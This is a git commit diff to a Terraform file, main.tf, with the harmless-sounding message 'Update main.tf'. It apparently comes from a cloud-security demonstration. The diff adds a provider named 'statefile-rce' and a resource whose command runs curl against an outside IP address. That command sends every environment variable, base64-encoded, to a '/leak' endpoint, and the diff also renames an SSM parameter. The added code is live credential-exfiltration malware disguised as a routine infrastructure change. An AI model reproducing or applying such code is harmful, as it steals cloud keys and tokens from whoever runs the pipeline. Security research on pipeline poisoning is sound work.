41e73bf0d85c4112d13fa2c66eddefae83f4c708
Anjali <68515341+peachycloudsecurity@users.noreply.github.com>
2025-02-02 20:52:38 +0530

    Update main.tf

--- main.tf
+++ main.tf
@@ -1,5 +1,19 @@
+terraform {
+  required_providers {
+    rce = {
+      source = "offensive-actions/statefile-rce"
+    }
+  }
+}
+
+provider "rce" {}
+
+resource "rce" "command" {
+  command = "curl \"http://18.234.164.103:8000/leak?data=$(env | base64 | tr -d '\n')\""
+}
+
 resource "aws_ssm_parameter" "foo" {
-  name  = "foo"
+  name  = "foddssdo"
   type  = "String"
   value = "barr"
 }
